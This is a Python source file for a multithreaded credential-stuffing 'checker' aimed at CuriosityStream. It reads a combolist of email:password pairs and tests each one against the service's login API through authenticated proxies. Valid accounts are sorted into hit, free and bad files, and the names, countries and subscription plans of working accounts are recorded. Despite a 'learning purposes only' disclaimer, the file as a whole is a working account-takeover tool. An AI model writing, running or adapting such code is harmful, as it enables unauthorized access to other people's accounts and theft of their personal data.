import tkinter
from tkinter import filedialog
from time import sleep
import datetime
import os
import ctypes
import requests
import keyboard
import threading
from art import *
import re
from colorama import Fore, init, Style
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

base_path = os.path.dirname(__file__)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    clear_screen()
    text = "Curiosity Stream"
    print(Fore.RED + text2art(text, font= 'small',))
    print(Fore.RED + text2art('CHECKER  BY  M97', font= 'small',))

def print_menu(title, options):
    print_header()
    print(Fore.CYAN + Style.BRIGHT + title)
    print(Fore.YELLOW + "=" * len(title))
    for index, option in enumerate(options, start=1):
        print(Fore.GREEN + f"[{index}] {option}")
    print(Fore.CYAN + "=" * len(title))


def update_title(x):
    if not x :
        x = (
            f"Curiosity Stream CHECKER BY CHEIKH "
            f"- TOTAL LINES = {total_lines}  "
            f"- CHECKED = [{testedc} / {total_lines}]  "
            f"- BAD = {badc}  "
            f"- HITS = {hitc}  "
            f"- FREE = {freec}  "
            f"- ERRORS = {retryc}"
        )
    ctypes.windll.kernel32.SetConsoleTitleW(x)
def get_thread_count():
    print(Fore.LIGHTMAGENTA_EX + 'PLEASE ENTER A NUMBER BETWEEN 1 AND 200')
    while True:
        thread_count = input('--->')
        if not thread_count.isdigit():
            print(Fore.RED + 'TYPE ERROR : NON DIGIT , PLEASE TRY AGAIN')
            continue
        thread_count = int(thread_count)
        if 1 <= thread_count <= 200:
            return thread_count
        else:
            print(Fore.RED + 'RANGE ERROR : ENTER A DIGIT BETWEEN 1 AND 200')

def firstchoice():
    print_menu('Main Menu', [
        'START CHECKING',
        'SET PROXY',
        'SETTINGS',
        'ABOUT PROGRAM',
        'QUIT'
    ])


def settings_choice():
    print_menu("SETTINGS", [
        "Threads - Default is 10",
        "Save BADS? Default is Yes",
        "Change an output folder",
        "Return to main menu",
    ])
def back_to_settings_menu():
    print('BACK TO SETTINGS MENU ? ')
    print('1 ) YES ')
    print('2) NO , QUIT ')
    print('CHOOSE 1 - 2')
    while True:
        choice =(input('-->'))
        if not choice.isdigit():
            print(Fore.RED + "TYPE ERROR : Please enter a digit between 1 and 2")
        if not choice in ['1','2']:
            print(Fore.RED + 'RANGE ERROR : Please enter a digit between 1 and 2')
        break
    return choice == '1'


def init_var():
    global testedc, badc, hitc, retryc , freec , goodc
    testedc = 0
    badc = 0
    freec = 0
    goodc =0
    hitc = 0
    retryc = 0

def choose_output_dir():
    update_title(title + " - Choosing output directory")
    global output_dir
    root = tkinter.Tk()
    root.attributes('-topmost', True)
    root.withdraw()
    output_dir = filedialog.askdirectory(title='Choose an output folder')
    root.destroy()
    if not output_dir:
        print('NO DIRECTORY SELECTED, Generating output path ...')
        print(f"RESULT WILL BE SAVED TO {base_path}")
        return base_path
    return output_dir


def make_dir_saving_files():
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
    path = os.path.join(output_dir, 'RESULTS', ts)
    os.makedirs(path, exist_ok=True)
    hit_file = os.path.join(path, 'HITS.txt')
    free_file = os.path.join(path, 'FREE.txt')
    bad_file = os.path.join(path, 'BAD.txt')
    tocheck_file = os.path.join(path, 'TOCHECK.txt')
    good_raw = os.path.join(path, 'good_raw.txt')
    return hit_file, free_file, bad_file, tocheck_file , good_raw

def get_menu_choice():
    update_title(title + " - Main Menu")
    firstchoice()
    while True:
        choice = input('--->')
        if choice not in ['1', '2', '3', '4','5']:
            print(Fore.RED + 'ERROR : PLEASE CHOOSE A NUMBER BETWEEN 1 AND 4')
            continue
        return int(choice)

global title 
title = "CuriosityStream CHECKER BY M97 [V1]"
def get_settings_choice():
    update_title(title + " - Settings Menu")
    settings_choice()
    while True:
        choice = input('--->')
        if not choice in ['1', '2', '3', '4']:
            print(Fore.RED + 'ERROR : PLEASE CHOOSE A NUMBER BETWEEN 1 AND 4')
            continue
        return int(choice)

def back_to_main_menu():
    print('BACK TO MAIN MENU ? ')
    print('1 ) YES ')
    print('2) NO , QUIT ')
    print('CHOOSE 1 - 2')
    while True:
        choice =(input('-->'))
        if not choice.isdigit():
            print(Fore.RED + "TYPE ERROR : Please enter a digit between 1 and 2")
        if not choice in ['1','2']:
            print(Fore.RED + 'RANGE ERROR : Please enter a digit between 1 and 2')
        break
    return choice == '1'

lock = threading.Lock()

def import_combo():
    root = tkinter.Tk()
    root.attributes('-topmost', True)
    root.withdraw()
    combo = filedialog.askopenfilename(title='Choose a combolist', filetypes=[("Text files", "*.txt")])
    root.destroy()
    global total_lines
    if not combo:
        print(Fore.RED + 'NO COMBOLIST SELECTED')
        return None, None, 0
    try:
        with open(combo, 'r',encoding= 'utf-8') as file:
            lines = file.readlines()
            total_lines = len(lines)
            if total_lines == 0:
                print(Fore.RED + 'COMBOLIST IS EMPTY.')
                return None, None, False
            else:
                print(Fore.GREEN + 'COMBOLIST LOADED SUCCESSFULLY.')
                return combo, lines, total_lines
    except FileNotFoundError:
        print(Fore.RED + 'ERROR : FILE NOT FOUND ')
        return None, None, 0
    except Exception as e:
        print(Fore.RED + f'ERROR LOADING FILE + {e}')
        return None, None, 0
def proxy_isvalid(x):
    proxy_pattern = re.compile(r'^[\w.-]+:\d+:[\w-]+:[\w-]+$')
    return proxy_pattern.match(x)
def proxy_iswork(x):
    parts = x.strip().split(':')
    username = parts[2]
    password = parts[3]
    ipport = parts[0]+":"+parts[1]
    proxy_auth = "{}:{}@{}".format(username, password, ipport)
    proxies = {
    "http":"http://{}".format(proxy_auth),
    "https": "http://{}".format(proxy_auth),
    }
    try:
        response = requests.get('https://cracked.io/',proxies=proxies,timeout= 10)
        print(Fore.CYAN + 'Testing your proxy . . . ')
        sleep(2)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False

def set_proxy():
    print(Fore.CYAN + 'For now , This checker only accepts a proxy in this format :  ')
    print(Fore.CYAN + '--> hostname:port:username:password ')
    print(Fore.CYAN + 'You can get some from https://proxyscrape.com/')
    print(Fore.LIGHTYELLOW_EX + "PASTE YOUR PROXY HERE : ")
    proxy = input("-->")
    while not proxy_isvalid(proxy):
        print(Fore.RED + "Wrong format . Please try again")
        print(Fore.RED + "Accepted format : hostname:port:username:password")
        print(Fore.RED + "Please contact the auther for further information")
        proxy = input(" Try again -->")
    print(Fore.GREEN + "PROXY LOADED SUCCESSFULLY , Please procees to checking.")
    return proxy


def write_to_file(filename, email, password, first_name, last_name, next_bill, country, subscription_state, cc):
    with open(filename, 'a') as f:
        f.writelines(10 * '*')
        f.writelines(f'Email : {email}\n')
        f.writelines(f'Password : {password}\n')
        f.writelines(f"First Name: {first_name}\n")
        f.writelines(f"Last Name: {last_name}\n")
        f.writelines(f"Next Bill: {next_bill}\n")
        f.writelines(f"Country: {country}\n")
        f.writelines(f"Subscription State: {subscription_state}\n")
        f.writelines(f"Credit Card: {cc}\n")
        f.writelines(10 * '*')

def request(x, y,proxies):
    url = 'https://api.curiositystream.com/v1/login/'
    payload = {'email': x, 'password': y}
    headers = {'content-type': 'application/json'}
    global hitc, badc, testedc, retryc, bad_file, hit_file , freec , good_raw , goodc
    parts = proxies.strip().split(':')
    username = parts[2]
    password = parts[3]
    ipport = parts[0]+":"+parts[1]
    proxy_auth = "{}:{}@{}".format(username, password, ipport)
    proxies = {
    "http":"http://{}".format(proxy_auth),
    "https": "http://{}".format(proxy_auth),
    }
    for attempt in range(3):
        try:
            response = requests.post(url, json=payload, headers=headers, proxies=proxies)
            with lock:
                testedc += 1           
            
            if response.status_code == 401 or "The password field is required." in response.text:
                badc += 1
                with lock:
                    print(Fore.RED + f"BAD: {x}:{y}")
                with open(bad_file, 'a') as f:
                    f.write(f'{x}:{y}\n') 
                break

            elif response.status_code == 403:
                retryc += 1
                if attempt < 2:
                    with lock:
                        print(f"RETRY: {x}:{y} (Attempt {attempt + 1})")
                    continue
                else:
                    with lock:
                        print(f"MAX RETRIES EXCEEDED: {x}:{y}")
                    break

            elif response.status_code == 201:
                result = response.text
                is_active = parsing(result,"Subscription","reason")     #parsing(string,L,R)
                plan = parsing(result,'"plan":{"name"','encoding').replace(':','').replace(',','').replace('"','')   #parsing(string,L,R)
                country = parsing(result,"country","zip_code").replace(',','').replace('"','').replace(':','')   #parsing(string,L,R)
                name = parsing(result,"first_name","last_name").replace(',','').replace('"','').replace(':','') +" "+ parsing(result,"last_name","username").replace(',','').replace('"','').replace(':','')     #parsing(string,L,R)
                if is_active.find('A') != -1:
                    with lock:
                        hitc +=1
                        print(Fore.GREEN +f"HIT -->: {x}:{y}")
                        print(Fore.GREEN + f"Email: {x}")
                        print(Fore.GREEN  +f"Name: {name}")
                        print(Fore.GREEN  +f"Country: {country}")
                        print(Fore.GREEN +f"Plan: {plan}")
                    with open(hit_file , 'a') as f:
                            f.writelines(20 * '*' + '\n')
                            f.writelines(f"Email: {x}\n")
                            f.writelines(f"Password: {y}\n")
                            f.writelines(f'As combo : {x}:{y} \n')
                            f.writelines(f"Name: {name}\n")
                            f.writelines(f"Country: {country}\n")
                            f.writelines(f"Plan: {plan}\n")
                            f.writelines(20 * '*')
                elif is_active.find('n') != -1:
                    with lock:
                        freec +=1
                        print(Fore.YELLOW +f"FREE -->: {x}:{y}")
                        print(Fore.YELLOW + f"Email: {x}")
                        print(Fore.YELLOW +f"Name: {name}")
                        print(Fore.YELLOW +f"Country: {country}")
                        print(Fore.YELLOW +f"Plan: {plan}")
                    with open(free_file , 'a') as f:
                            f.writelines(20 * '*' + '\n')
                            f.writelines(f"Email: {x}\n")
                            f.writelines(f"Password: {y}\n")
                            f.writelines(f'As combo : {x}:{y} \n')
                            f.writelines(f"Name: {name}\n")
                            f.writelines(f"Country: {country}\n")
                            f.writelines(f"Plan: {plan}\n")
                            f.writelines(20 * '*')
                else: 
                    with lock:
                        goodc += 1
                        with open(good_raw, 'a') as f:
                            f.writelines(f'{x}:{y}\n')
                            f.writelines(f'{response.status_code} + {is_active} + {result}\n')                   

                break
        except Exception as e:
            retryc += 1
            with lock:
                print(Fore.YELLOW +f"Error with {x}:{y}")
            break
    update_title(None)

def parsing(result,l,r):
    li = result.find(l)
    ri = result.find(r)
    if li != -1 and ri != -1:
        li += len(l)
        try:
            res = result[li:ri].strip()
            return res
        except Exception as e:
            return "N/A"
    else:
        return 'N/A'
def about_coder():
    print_header()
    print('')
    print('')
    print(Fore.CYAN + 10 * '   '+"About Program ? ")
    print('')
    print('')
    print(Fore.GREEN + "[+] Coder : CHEIKH-M97" )
    print(Fore.GREEN + "[+] Release Date : 9/20/2024" )
    print(Fore.GREEN + "[+] Version : 1.0.0" )
    print(Fore.GREEN + "[+] Github : https://github.com/CHEIKH-M97" )
    print(Fore.GREEN + "[+] Proxies : For the moment, This program supports residental proxies only" )
    print(Fore.GREEN + "[+] Proxies format : hostname:port:username:password")
    print(Fore.RED +   "[!] Warning : This open-source code in for learning purposes only . I am not responsible for any other uses ")
    print('')
    print('')
    print(Fore.CYAN + 10* '  '+ "Copyright © 2024 all rights reserved")
    print('')
    print('')


def main():

    print_header()
    global thread_count, saves_bad 
    thread_count = 10
    saves_bad = True
    print(Fore.LIGHTYELLOW_EX + 'WELCOME , Press any key to choose an output folder for your results')
    if keyboard.read_key():
        choose_output_dir()
        print(Fore.RED + 'Configuring ...')
        sleep(2.5)
    proxies = None
    while True:
        choice = get_menu_choice()
        if choice == 1:
            print('IMPORT YOUR COMBOLIST ')
            combo, lines, total_lines = import_combo()
            if total_lines is False:
                if not back_to_main_menu():
                    break
                continue
            if  proxies is None:
                print( Fore.RED +'Please load your proxy first.')
                proxies = set_proxy()
                if not proxy_iswork(proxies):
                    print(Fore.RED + f"Your proxy is in the right format but it does not work. Please re-check !")
                else:
                    print(Fore.GREEN + f"Your proxy is working !")
            sleep(1)
            clear_screen()
            global hit_file, free_file, bad_file, tocheck_file , good_raw
            hit_file, free_file, bad_file, tocheck_file , good_raw = make_dir_saving_files()
            init_var()
            with ThreadPoolExecutor(max_workers= thread_count) as executor:
                for line in lines:
                    try:
                        user, password = line.strip().split(':')
                        executor.submit(request, user, password, proxies)
                    except ValueError:
                        with lock:
                            print(f"Line skipped, not valid format: {line.strip()}")
            if not back_to_main_menu():
                break
            continue
        elif choice == 2:
            proxies = set_proxy()
            if not proxy_iswork(proxies):
                print(Fore.RED + f"Your proxy is in the right format but it does not work. Please re-check !")
            else:
                print(Fore.GREEN + f"Your proxy is working !")
            if not back_to_main_menu():
                break
            continue
        elif choice == 3:
            settings_menu = True
            while settings_menu:
                ch = get_settings_choice()
                if ch == 1:
                    thread_count = get_thread_count()
                    if not back_to_settings_menu():
                        return
                if ch == 2:
                    print (Fore.LIGHTMAGENTA_EX + '[Saves BADS is ON]' if saves_bad == True else Fore.LIGHTWHITE_EX +'[Saves BADS is OFF]')
                    print(' Saves BADS Y / N  ? ')
                    saves_bad = str(input('--->'))
                    while not saves_bad in ['Y', 'N']:
                        print(Fore.RED + 'INVALID CHOICE , Please choose "Y" or "N" ')
                        saves_bad = str(input('--->'))
                    print(Fore.GREEN + 'CHANGE SAVED.')
                    saves_bad = saves_bad == 'Y'
                    print(Fore.LIGHTMAGENTA_EX + '[Saves BADS is ON]' if saves_bad == True else Fore.LIGHTWHITE_EX +'[Saves BADS is OFF]')
                    if not back_to_settings_menu():
                        return
                if ch == 3:
                    output_dir = choose_output_dir()
                    print(Fore.GREEN + 'CHANGE SAVED')
                    print(Fore.GREEN + f"OUTPUT FOLDER IS NOW SET TO {output_dir}")
                    if not back_to_settings_menu():
                        return
                if ch == 4:
                    settings_menu = False
        elif choice == 4:
            about_coder()
            if not back_to_main_menu():
                return
        elif choice == 5:
            break
if __name__ == '__main__':
    main()